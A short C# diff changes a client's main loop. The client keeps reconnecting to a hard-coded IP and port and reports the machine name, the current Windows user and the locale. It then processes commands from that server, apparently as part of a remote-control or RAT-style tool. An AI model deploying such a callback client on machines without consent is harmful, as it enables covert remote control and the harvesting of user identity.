@@ -17,27 +17,21 @@ namespace Client
 
         static void Main(string[] args)
         {
-            while (true)
+            string host = "192.168.0.59";
+            int port = 1488;
+
+            while(true)
             {
                 try
                 {
                     tcpClient = new TcpClient();
-                    client = new Client(Environment.MachineName, CultureInfo.CurrentCulture.DisplayName, tcpClient);
-
-                    client.Connect("192.168.0.59", 1488);
-
-                    Thread getCommandThread = new Thread(new ThreadStart(client.GetCommand));
-                    getCommandThread.Start();
-
-                    Console.ReadKey();
-
+                    client = new Client(Environment.MachineName, System.Security.Principal.WindowsIdentity.GetCurrent().Name ,CultureInfo.CurrentCulture.DisplayName, tcpClient);
+                    client.Connect(host, port);
+                    client.Process();
                 }
                 catch (Exception ex)
                 {
                     Console.WriteLine(ex.Message);
-                }
-                finally
-                {
                     client.Disconnect();
                 }
             }
